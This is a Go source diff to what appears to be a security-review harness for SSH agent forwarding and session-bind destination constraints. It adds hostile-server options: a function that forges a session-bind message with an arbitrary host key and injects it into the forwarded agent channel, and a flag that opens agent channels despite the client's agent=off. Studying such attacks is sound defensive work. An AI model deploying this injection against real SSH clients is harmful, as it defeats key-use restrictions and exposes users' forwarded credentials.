@@ -43,7 +43,6 @@ import (
 
 	"golang.org/x/crypto/ssh"
 	"golang.org/x/crypto/ssh/agent"
-	"golang.org/x/sys/unix"
 
 	"mosey.spike/s3-agent-bind/bind"
 )
@@ -76,6 +75,8 @@ func bootstrap(args []string) error {
 	fs := flag.NewFlagSet("bootstrap", flag.ExitOnError)
 	dir := fs.String("dir", "", "session state directory")
 	trigger := fs.Bool("trigger", true, "open the forwarded agent once so ssh sends its bind")
+	hostileKey := fs.String("hostile-bind-key", "", "HOSTILE: after the trigger, send a session-bind signed by this host key on the same agent connection (a bind a hostile server can mint for any host it reaches, pre-auth)")
+	ignoreNoAgent := fs.Bool("hostile-ignore-noagent", false, "HOSTILE: open agent channels even when the client said agent=off")
 	fs.Parse(args)
 	if *dir == "" {
 		return errors.New("-dir required")
@@ -94,11 +95,14 @@ func bootstrap(args []string) error {
 				// One REQUEST_IDENTITIES: ssh connects to ForwardAgent's
 				// socket, sends session-bind first, then relays this.
 				_, err = agent.NewClient(c).List()
-				c.Close()
 				agentState = fmt.Sprintf("triggered-%dus", time.Since(t0).Microseconds())
 				if err != nil {
 					agentState = "trigger-error"
 				}
+				if *hostileKey != "" {
+					agentState += "+" + injectBind(c, *hostileKey)
+				}
+				c.Close()
 			}
 		}
 	}
@@ -122,7 +126,7 @@ func bootstrap(args []string) error {
 		return err
 	}
 	self, _ := os.Executable()
-	cmd := exec.Command(self, "session", "-dir", *dir, "-token", hex.EncodeToString(token))
+	cmd := exec.Command(self, "session", "-dir", *dir, "-token", hex.EncodeToString(token), fmt.Sprintf("-honour-noagent=%v", !*ignoreNoAgent))
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = nil, w, nil
 	logf, _ := os.OpenFile(filepath.Join(*dir, "session.log"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
 	cmd.Stderr = logf
@@ -141,6 +145,36 @@ func bootstrap(args []string) error {
 	return nil
 }
 
+// injectBind is the review's attack: the server writes a session-bind of
+// its own choosing down the forwarded agent channel after ssh's. The key
+// stands for any host the server can reach: a bind needs only the host's
+// signature over a session id, which any sshd gives before authentication.
+func injectBind(c net.Conn, keyPath string) string {
+	kb, err := os.ReadFile(keyPath)
+	if err != nil {
+		return "inject-nokey"
+	}
+	signer, err := ssh.ParsePrivateKey(kb)
+	if err != nil {
+		return "inject-badkey"
+	}
+	sid := make([]byte, 32)
+	rand.Read(sid)
+	sig, err := signer.Sign(rand.Reader, sid)
+	if err != nil {
+		return "inject-signfail"
+	}
+	b := &bind.Bind{HostKey: signer.PublicKey(), SID: sid, Sig: ssh.Marshal(sig), Fwd: true}
+	if _, err := c.Write(bind.ExtensionFrame(bind.SessionBindExt, b.Contents())); err != nil {
+		return "inject-writefail"
+	}
+	r, err := bind.ReadFrame(c)
+	if err != nil {
+		return "inject-noreply(" + strings.ReplaceAll(err.Error(), " ", "_") + ")"
+	}
+	return fmt.Sprintf("injected-reply%d", r[0])
+}
+
 type openMsg struct {
 	ID    int         `json:"id"`
 	Chain []bind.Link `json:"chain"`
@@ -155,6 +189,7 @@ func session(args []string) error {
 	dir := fs.String("dir", "", "")
 	token := fs.String("token", "", "")
 	idle := fs.Duration("idle", 120*time.Second, "exit after this long with no client")
+	honour := fs.Bool("honour-noagent", true, "with agent=off from the client, open no agent channels")
 	fs.Parse(args)
 	seed, err := os.ReadFile(filepath.Join(*dir, "identity.ed25519"))
 	if err != nil {
@@ -178,6 +213,7 @@ func session(args []string) error {
 
 	var mu sync.Mutex
 	var ctrl net.Conn
+	agentOff := false
 	pending := map[int]chan net.Conn{}
 	nextID := 0
 	deadline := time.AfterFunc(*idle, func() { os.Exit(0) })
@@ -204,6 +240,9 @@ func session(args []string) error {
 				case "CTRL":
 					mu.Lock()
 					ctrl = c
+					if len(f) > 2 && f[2] == "agent=off" && *honour {
+						agentOff = true
+					}
 					mu.Unlock()
 					deadline.Reset(*idle)
 					n := 0
@@ -223,7 +262,13 @@ func session(args []string) error {
 								k := n
 								out, _ := os.Create(filepath.Join(*dir, fmt.Sprintf("exec-%d.log", n)))
 								cmd := exec.Command(argv[0], argv[1:]...)
+								mu.Lock()
+								off := agentOff
+								mu.Unlock()
 								cmd.Env = append(os.Environ(), "SSH_AUTH_SOCK="+sockPath)
+								if off {
+									cmd.Env = append(os.Environ(), "SSH_AUTH_SOCK=")
+								}
 								cmd.Stdout, cmd.Stderr = out, out
 								go func() {
 									err := cmd.Run()
@@ -261,14 +306,13 @@ func session(args []string) error {
 		}
 		go func(lc *net.UnixConn) {
 			defer lc.Close()
-			var pid int
-			if raw, err := lc.SyscallConn(); err == nil {
-				raw.Control(func(fd uintptr) {
-					if cr, err := unix.GetsockoptUcred(int(fd), unix.SOL_SOCKET, unix.SO_PEERCRED); err == nil {
-						pid = int(cr.Pid)
-					}
-				})
+			mu.Lock()
+			off := agentOff
+			mu.Unlock()
+			if off {
+				return
 			}
+			chain := bind.PeerChain(lc)
 			mu.Lock()
 			c := ctrl
 			nextID++
@@ -281,7 +325,7 @@ func session(args []string) error {
 			}
 			tr := sha256.Sum256([]byte(fmt.Sprintf("stand-in transcript %s %d", *token, id)))
 			sig, _ := idSigner.Sign(rand.Reader, tr[:])
-			m := openMsg{ID: id, Chain: bind.ReadChain(pid), Transcript: hex.EncodeToString(tr[:]),
+			m := openMsg{ID: id, Chain: chain, Transcript: hex.EncodeToString(tr[:]),
 				IDSig: base64.StdEncoding.EncodeToString(ssh.Marshal(sig))}
 			j, _ := json.Marshal(m)
 			mu.Lock()
@@ -408,6 +452,6 @@ func printChain() error {
 	for _, l := range ch {
 		fmt.Println(" ", l)
 	}
-	fmt.Printf("quoin-sudo chain.remote: %v\n", bind.QuoinRemote(ch, os.Getuid()))
+	fmt.Printf("quoin-sudo chain.remote (Go restatement of 0331bf1): %v\n", bind.QuoinRemote(ch, os.Getuid()))
 	return nil
 }
